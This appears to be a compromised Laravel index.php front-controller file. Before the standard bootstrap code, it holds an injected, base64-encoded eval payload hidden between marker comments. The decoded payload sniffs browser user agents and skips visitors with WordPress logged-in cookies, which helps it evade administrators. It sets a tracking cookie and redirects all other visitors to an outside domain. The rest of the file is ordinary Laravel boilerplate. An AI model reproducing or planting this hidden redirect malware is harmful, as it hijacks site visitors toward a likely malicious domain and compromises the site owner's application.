<?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6IjsKICAgICRjaGVja0Nvb2tSZWRpclN0ciA9ICJhZU5lZThwaSI7CiAgICAkcmVkaXJlY3RBbGxvdyA9IHRydWU7CiAgICBmb3JlYWNoICgkX0NPT0tJRSBhcyAkY29va0tleT0+JGNvb2tWYWwpewogICAgICAgIGlmIChzdHJwb3MoJGNvb2tLZXksICd3b3JkcHJlc3NfbG9nZ2VkX2luJykgIT09IGZhbHNlIHx8ICRjb29rS2V5ID09ICRjaGVja0Nvb2tSZWRpclN0cikgewogICAgICAgICAgICAkcmVkaXJlY3RBbGxvdyA9IGZhbHNlOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgJHVhZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTsKCiAgICBpZiAoJHJlZGlyZWN0QWxsb3cpewogICAgICAgIGlmKGlzTW9iaWxlKCR1YWdlbnQpIHx8IGlzRGVza3RvcCgkdWFnZW50KSkgewogICAgICAgICAgICBzZXRjb29raWUoJGNoZWNrQ29va1JlZGlyU3RyLCAiMSIsIHRpbWUoKSArIDYwNDgwMCk7CiAgICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRyZWRpclRvIik7CiAgICAgICAgICAgIGRpZTsKICAgICAgICB9CiAgICB9Cn0='));/*aeR4Choc_end*/

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
